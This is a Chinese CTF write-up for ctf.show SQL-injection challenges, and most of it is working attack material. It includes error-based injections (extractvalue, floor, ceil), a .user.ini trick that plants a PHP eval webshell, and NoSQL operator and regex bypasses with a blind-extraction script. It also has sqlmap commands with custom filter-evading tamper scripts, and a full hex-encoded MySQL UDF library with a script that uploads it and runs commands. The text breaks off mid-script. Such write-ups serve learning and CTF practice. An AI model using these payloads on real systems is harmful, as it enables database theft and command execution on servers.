?&gt;&#x27;#\n\nfile注入\n这题过滤了php关键字，本来以为试试用phtml。但是wp看着这题的考点是上传配置文件user.ini。。。结合了文件上传\n在/var/www/html/dump目录下存在一个index.php文件，所以在同目录下我们可以去通过上传.user.ini配置文件，来实现文件包含的功能。将恶意代码包含到index.php中\n这里比较坑的是要保证配置项单独占一行，所以还要加上换行符\n不然会出现这种情况\n\nfilename=.user.ini&#x27;  lines starting by &#x27;auto_prepend_file = 1.txt\\n&#x27;%23 #包含文件# 写马的话就写简化版的filename=1.txt&#x27; LINES STARTING BY &#x27;&lt;?= eval($_POST[1])?&gt;&#x27;%23 #注入马\n\n报错注入\n题面，无过滤，单引号闭合\n\n参数点为id，注入检测时发现报错回显，可以利用报错注入\n\n\n\nexp:  需要注意的是由于此报错注入和updatexml都只能爆最大32位，如果要爆出32位之后的数据，需要借助mid或者substr等切割函数进行字符截取从而显示32位以后的数据\nid=1&#x27; and extractvalue(1, concat(0x23, (select version()))) %23id=1&#x27; and extractvalue(1, concat(0x23, (select group_concat(table_name) from information_schema.tables where table_schema=database()))) %23   # ctfshow_flagid=1&#x27; and extractvalue(1, concat(0x23, (select group_concat(column_name) from information_schema.columns where table_name=&#x27;ctfshow_flag&#x27;))) %23    #flagid=1&#x27; and extractvalue(1, concat(0x23, substr((select group_concat(flag) from ctfshow_flag),xx,xx))) %23\n\n报错注入\n过滤了updatexml，上面的继续打\n\n报错注入\n过滤updatexml extractvalue\n\n\n这里学一个floor报错注入，floor注入有个特点是没法用group_concat了，应该是外面还套了个concat的缘故，所以该用limit慢慢注出来\nexp：\nSELECT COUNT(*),floor(RAND(0)*2) as x from users GROUP BY x1&#x27; and (select 1 from (select count(*), concat(0x7e, database(), 0x7e, floor(rand(0)*2)) as x from ctfshow_user group by x ) as y)%23 id=1&#x27; and (select 1 from (select count(*), concat(0x7e, (select table_name from information_schema.tables where table_schema=database() limit 1,1), 0x7e, floor(rand(0)*2)) as x from ctfshow_user group by x ) as y)%23  # ctfshow_flagsid=1&#x27; and (select 1 from (select count(*), concat(0x7e, (select column_name from information_schema.columns where table_name=&#x27;ctfshow_flags&#x27; limit 1,1), 0x7e, floor(rand(0)*2)) as x from ctfshow_user group by x ) as y)%23  # flag2id=1&#x27; and (select 1 from (select count(*), concat(0x7e, (select flag2 from ctfshow_flags limit 0,1), 0x7e, floor(rand(0)*2)) as x from ctfshow_user group by x ) as y)%23\n\n报错注入\n过滤updatexml extractvalue floor\n\n\n其实还是可以继续基于floor的原理，找一个可以实现类似功能的函数即可。floor与rand搭配是用于能产生固定的序列\n\nfloor本身用于向下取整，小数部分舍弃。试试round或者ceil。也没有问题\n\n把上一关的payload关键词改成ceil即可\nctfshow_flagsa flag? 注意这里的字段名flag?里面的?为保留字符，所以需要包在反引号当中作为区分\n\nUDF注入\n先把sqlmap自带的可以执行命令的UDF文件进行解码\n\n其次便是要将这个文件放到目标机器的plugin目录下。如何查找该目录？\nshow variables like &#x27;%plugin%&#x27;;# 或者select @@plugin_dir\n\n查询方式：利用堆叠注入\npayload:\n?id=&#x27;;show variables like &#x27;%plugin%&#x27;; %23\n\n\n\n查到plugin路径为：/usr/lib/mariadb/plugin\n后面便是将文件写入进去，最后执行文件\nselect unhex(...) into dumpfile &quot;/usr/lib/mysql/plugin/lib_mysqludf_sys.so&quot;-- 引用共享库文件创建存储过程create function sys_eval returns string soname &quot;lib_mysqludf_sys.so&quot;;select sys_eval(&quot;whoami&quot;);drop function sys_eval; # 清除\ncreate function格式\nCREATE FUNCTION &lt;函数名&gt; ( [ &lt;参数1&gt; &lt;类型1&gt; [ , &lt;参数2&gt; &lt;类型2&gt;] ] … )  RETURNS &lt;类型&gt;  &lt;函数主体&gt;\n因为不太会写所以看了wp。这里有个细节就是文件大小问题，因为可能一次写入的长度有限制，所以wp选择了将udf文件分成5次写入到目标机器的txt文件中。最后再读出并且合并写入最终的so文件当中\n# coding=gbkimport requestsbase_url = &quot;http://419365ab-bd53-41c5-8ee6-cfce555b8be5.challenge.ctf.show/api/&quot;udf_inhex = &quot;7F454C4602010100000000000000000003003E0001000000800A000000000000400000000000000058180000000000000000000040003800060040001C0019000100000005000000000000000000000000000000000000000000000000000000C414000000000000C41400000000000000002000000000000100000006000000C814000000000000C814200000000000C8142000000000004802000000000000580200000000000000002000000000000200000006000000F814000000000000F814200000000000F814200000000000800100000000000080010000000000000800000000000000040000000400000090010000000000009001000000000000900100000000000024000000000000002400000000000000040000000000000050E574640400000044120000000000004412000000000000441200000000000084000000000000008400000000000000040000000000000051E5746406000000000000000000000000000000000000000000000000000000000000000000000000000000000000000800000000000000040000001400000003000000474E5500D7FF1D94176ABA0C150B4F3694D2EC995AE8E1A8000000001100000011000000020000000700000080080248811944C91CA44003980468831100000013000000140000001600000017000000190000001C0000001E000000000000001F00000000000000200000002100000022000000230000002400000000000000CE2CC0BA673C7690EBD3EF0E78722788B98DF10ED971581CA868BE12BBE3927C7E8B92CD1E7066A9C3F9BFBA745BB073371974EC4345D5ECC5A62C1CC3138AFF3B9FD4A0AD73D1C50B5911FEAB5FBE1200000000000000000000000000000000000000000000000000000000000000000300090088090000000000000000000000000000010000002000000000000000000000000000000000000000250000002000000000000000000000000000000000000000CD00000012000000000000000000000000000000000000001E0100001200000000000000000000000000000000000000620100001200000000000000000000000000000000000000E30000001200000000000000000000000000000000000000B90000001200000000000000000000000000000000000000680100001200000000000000000000000000000000000000160000002200000000000000000000000000000000000000540000001200000000000000000000000000000000000000F00000001200000000000000000000000000000000000000B200000012000000000000000000000000000000000000005A01000012000000000000000000000000000000000000005201000012000000000000000000000000000000000000004C0100001200000000000000000000000000000000000000E800000012000B00D10D000000000000D1000000000000003301000012000B00A90F0000000000000A000000000000001000000012000C00481100000000000000000000000000007800000012000B009F0B0000000000004C00000000000000FF0000001200090088090000000000000000000000000000800100001000F1FF101720000000000000000000000000001501000012000B00130F0000000000002F000000000000008C0100001000F1FF201720000000000000000000000000009B00000012000B00480C0000000000000A000000000000002501000012000B00420F0000000000006700000000000000AA00000012000B00520C00000000000063000000000000005B00000012000B00950B0000000000000A000000000000008E00000012000B00EB0B0000000000005D00000000000000790100001000F1FF101720000000000000000000000000000501000012000B00090F0000000000000A00000000000000C000000012000B00B50C000000000000F100000000000000F700000012000B00A20E00000000000067000000000000003900000012000B004C0B0000000000004900000000000000D400000012000B00A60D0000000000002B000000000000004301000012000B00B30F0000000000005501000000000000005F5F676D6F6E5F73746172745F5F005F66696E69005F5F6378615F66696E616C697A65005F4A765F5265676973746572436C6173736573006C69625F6D7973716C7564665F7379735F696E666F5F696E6974006D656D637079006C69625F6D7973716C7564665F7379735F696E666F5F6465696E6974006C69625F6D7973716C7564665F7379735F696E666F007379735F6765745F696E6974007379735F6765745F6465696E6974007379735F67657400676574656E76007374726C656E007379735F7365745F696E6974006D616C6C6F63007379735F7365745F6465696E69740066726565007379735F73657400736574656E76007379735F657865635F696E6974007379735F657865635F6465696E6974007379735F657865630073797374656D007379735F6576616C5F696E6974007379735F6576616C5F6465696E6974007379735F6576616C00706F70656E007265616C6C6F63007374726E6370790066676574730070636C6F7365006C6962632E736F2E36005F6564617461005F5F6273735F7374617274005F656E6400474C4942435F322E322E3500000000000000000000020002000200020002000200020002000200020002000200020001000100010001000100010001000100010001000100010001000100010001000100010001000100010001006F0100001000000000000000751A6909000002009101000000000000F0142000000000000800000000000000F0142000000000007816200000000000060000000200000000000000000000008016200000000000060000000300000000000000000000008816200000000000060000000A0000000000000000000000A81620000000000007000000040000000000000000000000B01620000000000007000000050000000000000000000000B81620000000000007000000060000000000000000000000C01620000000000007000000070000000000000000000000C81620000000000007000000080000000000000000000000D01620000000000007000000090000000000000000000000D816200000000000070000000A0000000000000000000000E016200000000000070000000B0000000000000000000000E816200000000000070000000C0000000000000000000000F016200000000000070000000D0000000000000000000000F816200000000000070000000E00000000000000000000000017200000000000070000000F00000000000000000000000817200000000000070000001000000000000000000000004883EC08E8EF000000E88A010000E8750700004883C408C3FF35F20C2000FF25F40C20000F1F4000FF25F20C20006800000000E9E0FFFFFFFF25EA0C20006801000000E9D0FFFFFFFF25E20C20006802000000E9C0FFFFFFFF25DA0C20006803000000E9B0FFFFFFFF25D20C20006804000000E9A0FFFFFFFF25CA0C20006805000000E990FFFFFFFF25C20C20006806000000E980FFFFFFFF25BA0C20006807000000E970FFFFFFFF25B20C20006808000000E960FFFFFFFF25AA0C20006809000000E950FFFFFFFF25A20C2000680A000000E940FFFFFFFF259A0C2000680B000000E930FFFFFFFF25920C2000680C000000E920FFFFFF4883EC08488B05ED0B20004885C07402FFD04883C408C390909090909090909055803D680C2000004889E5415453756248833DD00B200000740C488D3D2F0A2000E84AFFFFFF488D1D130A20004C8D25040A2000488B053D0C20004C29E348C1FB034883EB014839D873200F1F4400004883C0014889051D0C200041FF14C4488B05120C20004839D872E5C605FE0B2000015B415CC9C3660F1F84000000000048833DC009200000554889E5741A488B054B0B20004885C0740E488D3DA7092000C9FFE00F1F4000C9C39090554889E54883EC3048897DE8488975E0488955D8488B45E08B0085C07421488D0DE7050000488B45D8BA320000004889CE4889C7E89BFEFFFFC645FF01EB04C645FF000FB645FFC9C3554889E548897DF8C9C3554889E54883EC3048897DF8488975F0488955E848894DE04C8945D84C894DD0488D0DCA050000488B45E8BA1F0000004889CE4889C7E846FEFFFF488B45E048C7001E000000488B45E8C9C3554889E54883EC2048897DF8488975F0488955E8488B45F08B0083F801751C488B45F0488B40088B0085C0750E488B45F8C60001B800000000EB20488D0D83050000488B45E8BA2B0000004889CE4889C7E8DFFDFFFFB801000000C9C3554889E548897DF8C9C3554889E54883EC4048897DE8488975E0488955D848894DD04C8945C84C894DC0488B45E0488B4010488B004889C7E8BBFDFFFF488945F848837DF8007509488B45C8C60001EB16488B45F84889C7E84BFDFFFF4889C2488B45D0488910488B45F8C9C3554889E54883EC2048897DF8488975F0488955E8488B45F08B0083F8027425488D0D05050000488B45E8BA1F0000004889CE4889C7E831FDFFFFB801000000E9AB000000488B45F0488B40088B0085C07422488D0DF2040000488B45E8BA280000004889CE4889C7E8FEFCFFFFB801000000EB7B488B45F0488B40084883C004C70000000000488B45F0488B4018488B10488B45F0488B40184883C008488B00488D04024883C0024889C7E84BFCFFFF4889C2488B45F848895010488B45F8488B40104885C07522488D0DA4040000488B45E8BA1A0000004889CE4889C7E888FCFFFFB801000000EB05B800000000C9C3554889E54883EC1048897DF8488B45F8488B40104885C07410488B45F8488B40104889C7E811FCFFFFC9C3554889E54883EC3048897DE8488975E0488955D848894DD0488B45E8488B4010488945F0488B45E0488B4018488B004883C001480345F0488945F8488B45E0488B4018488B10488B45E0488B4010488B08488B45F04889CE4889C7E8EFFBFFFF488B45E0488B4018488B00480345F0C60000488B45E0488B40184883C008488B10488B45E0488B40104883C008488B08488B45F84889CE4889C7E8B0FBFFFF488B45E0488B40184883C008488B00480345F8C60000488B4DF8488B45F0BA010000004889CE4889C7E892FBFFFF4898C9C3554889E54883EC3048897DE8488975E0488955D8C745FC00000000488B45E08B0083F801751F488B45E0488B40088B55FC48C1E2024801D08B0085C07507B800000000EB20488D0DC2020000488B45D8BA2B0000004889CE4889C7E81EFBFFFFB801000000C9C3554889E548897DF8C9C3554889E54883EC2048897DF8488975F0488955E848894DE0488B45F0488B4010488B004889C7E882FAFFFF4898C9C3554889E54883EC3048897DE8488975E0488955D8C745FC00000000488B45E08B0083F801751F488B45E0488B40088B55FC48C1E2024801D08B0085C07507B800000000EB20488D0D22020000488B45D8BA2B0000004889CE4889C7E87EFAFFFFB801000000C9C3554889E548897DF8C9C3554889E54881EC500400004889BDD8FBFFFF4889B5D0FBFFFF488995C8FBFFFF48898DC0FBFFFF4C8985B8FBFFFF4C898DB0FBFFFFBF01000000E8BEF9FFFF488985C8FBFFFF48C745F000000000488B85D0FBFFFF488B4010488B00488D352C0200004889C7E852FAFFFF488945E8EB63488D85E0FBFFFF4889C7E8BDF9FFFF488945F8488B45F8488B55F04801C2488B85C8FBFFFF4889D64889C7E80CFAFFFF488985C8FBFFFF488D85E0FBFFFF488B55F0488B8DC8FBFFFF4801D1488B55F84889C64889CFE8D1F9FFFF488B45F8480145F0488B55E8488D85E0FBFFFFBE000400004889C7E831F9FFFF4885C07580488B45E84889C7E850F9FFFF488B85C8FBFFFF0FB60084C0740A4883BDC8FBFFFF00750C488B85B8FBFFFFC60001EB2B488B45F0488B95C8FBFFFF488D0402C60000488B85C8FBFFFF4889C7E8FBF8FFFF488B95C0FBFFFF488902488B85C8FBFFFFC9C39090909090909090554889E5534883EC08488B05A80320004883F8FF7419488D1D9B0320000F1F004883EB08FFD0488B034883F8FF75F14883C4085BC9C390904883EC08E84FF9FFFF4883C408C300004E6F20617267756D656E747320616C6C6F77656420287564663A206C69625F6D7973716C7564665F7379735F696E666F29000000000000006C69625F6D7973716C7564665F7379732076657273696F6E20302E302E33000045787065637465642065786163746C79206F6E6520737472696E67207479706520706172616D6574657200000000000045787065637465642065786163746C792074776F20617267756D656E74730000457870656374656420737472696E67207479706520666F72206E616D6520706172616D6574657200436F756C64206E6F7420616C6C6F63617465206D656D6F7279007200011B033B800000000F00000008F9FFFF9C00000051F9FFFFBC0000005BF9FFFFDC000000A7F9FFFFFC00000004FAFFFF1C0100000EFAFFFF3C01000071FAFFFF5C01000062FBFFFF7C0100008DFBFFFF9C0100005EFCFFFFBC010000C5FCFFFFDC010000CFFCFFFFFC010000FEFCFFFF1C02000065FDFFFF3C0200006FFDFFFF5C0200001400000000000000017A5200017810011B0C0708900100001C0000001C00000064F8FFFF4900000000410E108602430D0602440C070800001C0000003C0000008DF8FFFF0A00000000410E108602430D06450C07080000001C0000005C00000077F8FFFF4C00000000410E108602430D0602470C070800001C0000007C000000A3F8FFFF5D00000000410E108602430D0602580C070800001C0000009C000000E0F8FFFF0A00000000410E108602430D06450C07080000001C000000BC000000CAF8FFFF6300000000410E108602430D06025E0C070800001C000000DC0000000DF9FFFFF100000000410E108602430D0602EC0C070800001C000000FC000000DEF9FFFF2B00000000410E108602430D06660C07080000001C0000001C010000E9F9FFFFD100000000410E108602430D0602CC0C070800001C0000003C0100009AFAFFFF6700000000410E108602430D0602620C070800001C0000005C010000E1FAFFFF0A00000000410E108602430D06450C07080000001C0000007C010000CBFAFFFF2F00000000410E108602430D066A0C07080000001C0000009C010000DAFAFFFF6700000000410E108602430D0602620C070800001C000000BC01000021FBFFFF0A00000000410E108602430D06450C07080000001C000000DC0100000BFBFFFF5501000000410E108602430D060350010C0708000000000000000000FFFFFFFFFFFFFFFF0000000000000000FFFFFFFFFFFFFFFF00000000000000000000000000000000F01420000000000001000000000000006F010000000000000C0000000000000088090000000000000D000000000000004811000000000000F5FEFF6F00000000B8010000000000000500000000000000E805000000000000060000000000000070020000000000000A000000000000009D010000000000000B000000000000001800000000000000030000000000000090162000000000000200000000000000380100000000000014000000000000000700000000000000170000000000000050080000000000000700000000000000F0070000000000000800000000000000600000000000000009000000000000001800000000000000FEFFFF6F00000000D007000000000000FFFFFF6F000000000100000000000000F0FFFF6F000000008607000000000000F9FFFF6F0000000001000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000F81420000000000000000000000000000000000000000000B609000000000000C609000000000000D609000000000000E609000000000000F609000000000000060A000000000000160A000000000000260A000000000000360A000000000000460A000000000000560A000000000000660A000000000000760A0000000000004743433A2028474E552920342E342E3720323031323033313320285265642048617420342E342E372D3429004743433A2028474E552920342E342E3720323031323033313320285265642048617420342E342E372D31372900002E73796D746162002E737472746162002E7368737472746162002E6E6F74652E676E752E6275696C642D6964002E676E752E68617368002E64796E73796D002E64796E737472002E676E752E76657273696F6E002E676E752E76657273696F6E5F72002E72656C612E64796E002E72656C612E706C74002E696E6974002E74657874002E66696E69002E726F64617461002E65685F6672616D655F686472002E65685F6672616D65002E63746F7273002E64746F7273002E6A6372002E646174612E72656C2E726F002E64796E616D6963002E676F74002E676F742E706C74002E627373002E636F6D6D656E7400000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001B0000000700000002000000000000009001000000000000900100000000000024000000000000000000000000000000040000000000000000000000000000002E000000F6FFFF6F0200000000000000B801000000000000B801000000000000B400000000000000030000000000000008000000000000000000000000000000380000000B000000020000000000000070020000000000007002000000000000780300000000000004000000020000000800000000000000180000000000000040000000030000000200000000000000E805000000000000E8050000000000009D0100000000000000000000000000000100000000000000000000000000000048000000FFFFFF6F0200000000000000860700000000000086070000000000004A0000000000000003000000000000000200000000000000020000000000000055000000FEFFFF6F0200000000000000D007000000000000D007000000000000200000000000000004000000010000000800000000000000000000000000000064000000040000000200000000000000F007000000000000F00700000000000060000000000000000300000000000000080000000000000018000000000000006E000000040000000200000000000000500800000000000050080000000000003801000000000000030000000A000000080000000000000018000000000000007800000001000000060000000000000088090000000000008809000000000000180000000000000000000000000000000400000000000000000000000000000073000000010000000600000000000000A009000000000000A009000000000000E0000000000000000000000000000000040000000000000010000000000000007E000000010000000600000000000000800A000000000000800A000000000000C80600000000000000000000000000001000000000000000000000000000000084000000010000000600000000000000481100000000000048110000000000000E000000000000000000000000000000040000000000000000000000000000008A00000001000000020000000000000058110000000000005811000000000000EC0000000000000000000000000000000800000000000000000000000000000092000000010000000200000000000000441200000000000044120000000000008400000000000000000000000000000004000000000000000000000000000000A0000000010000000200000000000000C812000000000000C812000000000000FC01000000000000000000000000000008000000000000000000000000000000AA000000010000000300000000000000C814200000000000C8140000000000001000000000000000000000000000000008000000000000000000000000000000B1000000010000000300000000000000D814200000000000D8140000000000001000000000000000000000000000000008000000000000000000000000000000B8000000010000000300000000000000E814200000000000E8140000000000000800000000000000000000000000000008000000000000000000000000000000BD000000010000000300000000000000F014200000000000F0140000000000000800000000000000000000000000000008000000000000000000000000000000CA000000060000000300000000000000F814200000000000F8140000000000008001000000000000040000000000000008000000000000001000000000000000D3000000010000000300000000000000781620000000000078160000000000001800000000000000000000000000000008000000000000000800000000000000D8000000010000000300000000000000901620000000000090160000000000008000000000000000000000000000000008000000000000000800000000000000E1000000080000000300000000000000101720000000000010170000000000001000000000000000000000000000000008000000000000000000000000000000E60000000100000030000000000000000000000000000000101700000000000059000000000000000000000000000000010000000000000001000000000000001100000003000000000000000000000000000000000000006917000000000000EF00000000000000000000000000000001000000000000000000000000000000010000000200000000000000000000000000000000000000581F00000000000068070000000000001B0000002C00000008000000000000001800000000000000090000000300000000000000000000000000000000000000C02600000000000042030000000000000000000000000000010000000000000000000000000000000000000000000000000000000000000000000000000000000000000003000100900100000000000000000000000000000000000003000200B80100000000000000000000000000000000000003000300700200000000000000000000000000000000000003000400E80500000000000000000000000000000000000003000500860700000000000000000000000000000000000003000600D00700000000000000000000000000000000000003000700F00700000000000000000000000000000000000003000800500800000000000000000000000000000000000003000900880900000000000000000000000000000000000003000A00A00900000000000000000000000000000000000003000B00800A00000000000000000000000000000000000003000C00481100000000000000000000000000000000000003000D00581100000000000000000000000000000000000003000E00441200000000000000000000000000000000000003000F00C81200000000000000000000000000000000000003001000C81420000000000000000000000000000000000003001100D81420000000000000000000000000000000000003001200E81420000000000000000000000000000000000003001300F01420000000000000000000000000000000000003001400F81420000000000000000000000000000000000003001500781620000000000000000000000000000000000003001600901620000000000000000000000000000000000003001700101720000000000000000000000000000000000003001800000000000000000000000000000000000100000002000B00800A0000000000000000000000000000110000000400F1FF000000000000000000000000000000001C00000001001000C81420000000000000000000000000002A00000001001100D81420000000000000000000000000003800000001001200E81420000000000000000000000000004500000002000B00A00A00000000000000000000000000005B00000001001700101720000000000001000000000000006A00000001001700181720000000000008000000000000007800000002000B00200B0000000000000000000000000000110000000400F1FF000000000000000000000000000000008400000001001000D01420000000000000000000000000009100000001000F00C01400000000000000000000000000009F00000001001200E8142000000000000000000000000000AB00000002000B0010110000000000000000000000000000C10000000400F1FF00000000000000000000000000000000D40000000100F1FF90162000000000000000000000000000EA00000001001300F0142000000000000000000000000000F700000001001100E0142000000000000000000000000000040100000100F1FFF81420000000000000000000000000000D01000012000B00D10D000000000000D1000000000000001501000012000B00130F0000000000002F000000000000001E01000020000000000000000000000000000000000000002D01000020000000000000000000000000000000000000004101000012000C00481100000000000000000000000000004701000012000B00A90F0000000000000A000000000000005701000012000000000000000000000000000000000000006B01000012000000000000000000000000000000000000007F01000012000B00A20E00000000000067000000000000008D01000012000B00B30F0000000000005501000000000000960100001200000000000000000000000000000000000000A901000012000B00950B0000000000000A00000000000000C601000012000B00B50C000000000000F100000000000000D30100001200000000000000000000000000000000000000E50100001200000000000000000000000000000000000000F901000012000000000000000000000000000000000000000D02000012000B004C0B00000000000049000000000000002802000022000000000000000000000000000000000000004402000012000B00A60D0000000000002B000000000000005302000012000B00EB0B0000000000005D000000000000006002000012000B00480C0000000000000A000000000000006F02000012000000000000000000000000000000000000008302000012000B00420F0000000000006700000000000000910200001200000000000000000000000000000000000000A50200001200000000000000000000000000000000000000B902000012000B00520C0000000000006300000000000000C10200001000F1FF10172000000000000000000000000000CD02000012000B009F0B0000000000004C00000000000000E30200001000F1FF20172000000000000000000000000000E80200001200000000000000000000000000000000000000FD02000012000B00090F0000000000000A000000000000000D0300001200000000000000000000000000000000000000220300001000F1FF101720000000000000000000000000002903000012000000000000000000000000000000000000003C03000012000900880900000000000000000000000000000063616C6C5F676D6F6E5F73746172740063727473747566662E63005F5F43544F525F4C4953545F5F005F5F44544F525F4C4953545F5F005F5F4A43525F4C4953545F5F005F5F646F5F676C6F62616C5F64746F72735F61757800636F6D706C657465642E363335320064746F725F6964782E36333534006672616D655F64756D6D79005F5F43544F525F454E445F5F005F5F4652414D455F454E445F5F005F5F4A43525F454E445F5F005F5F646F5F676C6F62616C5F63746F72735F617578006C69625F6D7973716C7564665F7379732E63005F474C4F42414C5F4F46465345545F5441424C455F005F5F64736F5F68616E646C65005F5F44544F525F454E445F5F005F44594E414D4943007379735F736574007379735F65786563005F5F676D6F6E5F73746172745F5F005F4A765F5265676973746572436C6173736573005F66696E69007379735F6576616C5F6465696E6974006D616C6C6F634040474C4942435F322E322E350073797374656D4040474C4942435F322E322E35007379735F657865635F696E6974007379735F6576616C0066676574734040474C4942435F322E322E35006C69625F6D7973716C7564665F7379735F696E666F5F6465696E6974007379735F7365745F696E697400667265654040474C4942435F322E322E35007374726C656E4040474C4942435F322E322E350070636C6F73654040474C4942435F322E322E35006C69625F6D7973716C7564665F7379735F696E666F5F696E6974005F5F6378615F66696E616C697A654040474C4942435F322E322E35007379735F7365745F6465696E6974007379735F6765745F696E6974007379735F6765745F6465696E6974006D656D6370794040474C4942435F322E322E35007379735F6576616C5F696E697400736574656E764040474C4942435F322E322E3500676574656E764040474C4942435F322E322E35007379735F676574005F5F6273735F7374617274006C69625F6D7973716C7564665F7379735F696E666F005F656E64007374726E6370794040474C4942435F322E322E35007379735F657865635F6465696E6974007265616C6C6F634040474C4942435F322E322E35005F656461746100706F70656E4040474C4942435F322E322E35005F696E697400&quot;payload = []text = [&#x27;1&#x27;, &#x27;2&#x27;, &#x27;3&#x27;, &#x27;4&#x27;, &#x27;5&#x27;]for i in range(0, 21510, 5000):    end = i + 5000    payload.append(udf_inhex[i:end])p = dict(zip(text, payload))for t in text:    url = base_url + f&quot;?id=&#x27;;select unhex(&#x27;&#123;p[t]&#125;&#x27;) into dumpfile &#x27;/usr/lib/mariadb/plugin/&#123;t&#125;.txt&#x27;; #&quot;    r = requests.get(url)    print(r.status_code)# 正式写入so文件next_url = base_url + &quot;?id=&#x27;; select concat(load_file(&#x27;/usr/lib/mariadb/plugin/1.txt&#x27;),load_file(&#x27;/usr/lib/mariadb/plugin/2.txt&#x27;),load_file(&#x27;/usr/lib/mariadb/plugin/3.txt&#x27;),load_file(&#x27;/usr/lib/mariadb/plugin/4.txt&#x27;),load_file(&#x27;/usr/lib/mariadb/plugin/5.txt&#x27;)) into dumpfile &#x27;/usr/lib/mariadb/plugin/udf.so&#x27;; #&quot;r = requests.get(next_url)print(r.status_code)udf_url = base_url + &quot;?id=&#x27;;create function sys_eval returns string soname &#x27;udf.so&#x27;; #&quot;r = requests.get(udf_url)final_url = base_url + &quot;?id=&#x27;;select sys_eval(&#x27;cat /flag*&#x27;); #&quot;r = requests.get(final_url)print(r.text)\n\nNoSQL注入\n\nhttps://www.anquanke.com/post/id/97211\nflag在flag中gt : &gt;$lt : &lt;$gte: &gt;=$lte: &lt;=$ne : !=、&lt;&gt;$in : in$nin: not in$all: all $or:or$not: 反匹配(1.3.3及以上版本)$regex\n传参点为id 无过滤\n\n\n这里可以利用重演式攻击，通过传递数组的方式来进行注入\npayload:\n?id[$in]=flag\n\nNoSQL注入\n题面\n\n\n返回逻辑，也就是登录成功即可爆出flag\n\nPOST传参，参数点为username和password\n\n和上题的思路一致，（就是那个执行语句比较抽象），重演式注入\nusername[$ne]=&amp;password[$ne]=\n\nNoSQL注入\n这题的题面和上一关没有变化，注入进去后并没有爆出flag \n\n\n\n离谱，说明这题是不想让我们以admin用户名登录进去\nusername[$ne]=admin&amp;password[$ne]=\n\nNoSQL注入\n可以看到题面发生了变化\n\n\n\nmongodb的find().pretty()方法的作用。使得查询出来的数据在命令行中更加美观的显示，不至于太紧凑\n沿用上一关的payload，发现又多出来个admin1。。。试试正则绕过\nusername[$regex]=^[^admin].*$&amp;password[$ne]=[^xyz] 匹配未包含的任意字符\n\nNoSQL注入\n这关和上一关题面一致，但是payload打不通了。应该是盲注，利用正则匹配出flag来\n# coding=gbkimport requestsimport stringdb = string.ascii_lowercase + string.digits + &#x27;_-&#123;&#125;&#x27;url = &quot;http://637fc69e-5c8f-4c57-b062-92e7fbddff28.challenge.ctf.show/api/&quot;flag = &quot;&quot;for i in range(100):    for s in db:        payload = f&quot;^&#123;flag+s&#125;.*$&quot;        data = &#123;            &quot;username[$regex]&quot;:&#x27;flag&#x27;,            &quot;password[$regex]&quot;:payload        &#125;        r = requests.post(url, data=data)        if r&quot;\\u767b\\u9646\\u6210\\u529f&quot; in r.text:            flag += s            print(flag)            break    if &#x27;&#125;&#x27; in flag:        break\n\n\n 后面补充下中间sqlmap部分的内容\n\n 205. sqlmap\n\n      sqlmap -u &quot;http://1b66a511-986d-46af-8397-9f8a76a4ff43.challenge.ctf.show/api/index.php&quot; --safe-url=&quot;http://1b66a511-986d-46af-8397-9f8a76a4ff43.challenge.ctf.show/api/getToken.php&quot; --safe-freq=1 --method=&quot;PUT&quot; --data=&quot;id=1&quot; --headers=&quot;Content-Type: text/plain;&quot; --refer=&quot;ctf.show&quot; -dbms mysql -D ctfshow_web -T ctfshow_flax  -C &quot;flagx,tes&quot; --dump\n\n 206. sqlmap 发现上面的payload还能用。它想考一个闭合，但是sqlmap可以自动检测\n\n      sqlmap -u &quot;http://53dc3fcd-908e-4457-9c27-580bcff8fff8.challenge.ctf.show/api/index.php&quot; --safe-url=&quot;http://53dc3fcd-908e-4457-9c27-580bcff8fff8.challenge.ctf.show/api/getToken.php&quot; --safe-freq=1 --method=&quot;PUT&quot; --data=&quot;id=1&quot; --headers=&quot;Content-Type: text/plain;&quot; --refer=&quot;ctf.show&quot; -dbms mysql -D ctfshow_web -T ctfshow_flaxc -C &quot;flagv,tes&quot; --dump\n\n 207. sqlmap 使用tamper脚本来绕过一些过滤\n\n      这道题过滤了空格，所以我们可以使用内置脚本space2comment.py（其会利用/**/来绕过空格）\n\n      sqlmap -u &quot;http://0a585485-b04b-4bbf-8efc-29442e7846f1.challenge.ctf.show/api/index.php&quot; --safe-url=&quot;http://0a585485-b04b-4bbf-8efc-29442e7846f1.challenge.ctf.show/api/getToken.php&quot; --safe-freq=1 --method=&quot;PUT&quot; --data=&quot;id=1&quot; --headers=&quot;Content-Type: text/plain;&quot; --refer=&quot;ctf.show&quot; -dbms mysql --tamper=space2comment.py  -D ctfshow_web -T ctfshow_flaxca -C &quot;flagvc&quot; --dump\n\n 208. sqlmap 这道题过滤了空格和关键词`select`\n\n      打算自己写个脚本\n\n      #!/usr/bin/env pythonfrom lib.core.compat import xrangefrom lib.core.enums import PRIORITY__priority__ = PRIORITY.LOWdef dependencies():    passdef tamper(payload, **kwargs):    retVal = payload    if payload:        retVal = &quot;&quot;        quote, doublequote, firstspace = False, False, False        for i in xrange(len(payload)):            if not firstspace:                if payload[i].isspace():                    firstspace = True                    retVal += &quot;/**/&quot;                    continue            elif payload[i] == &#x27;\\&#x27;&#x27;:                quote = not quote            elif payload[i] == &#x27;&quot;&#x27;:                doublequote = not doublequote            elif payload[i] == &quot; &quot; and not doublequote and not quote:                retVal += &quot;/**/&quot;                continue            retVal += payload[i]        # 就加了下面一行替换        retVal = retVal.replace(&quot;select&quot;, &quot;sselectelect&quot;)    return retVal\n\n      sqlmap -u &quot;http://66af8c09-8165-4f2f-b817-45701578d5eb.challenge.ctf.show/api/index.php&quot; --safe-url=&quot;http://66af8c09-8165-4f2f-b817-45701578d5eb.challenge.ctf.show/api/getToken.php&quot; --safe-freq=1 --method=&quot;PUT&quot; --data=&quot;id=1&quot; --headers=&quot;Content-Type: text/plain;&quot; --refer=&quot;ctf.show&quot; -dbms mysql --tamper=ctfshow208.py -D ctfshow_web -T ctfshow_flaxcac -C &quot;flagvca&quot; --dump\n\n      209. sqlmap 过滤了空格，内行注释和等号\n\n           还是需要去修改脚本\n\n           对于空格 我们可以使用`%09`绕过，对于`=`可以换成like关键字\n\n           还是对sqlmap的传参过程不是很清晰，这里竟然可以直接用python的chr()函数作替换\n\n           #!/usr/bin/env pythonfrom lib.core.compat import xrangefrom lib.core.enums import PRIORITY__priority__ = PRIORITY.LOWdef dependencies():    passdef tamper(payload, **kwargs):    retVal = payload    if payload:        retVal = &quot;&quot;        quote, doublequote, 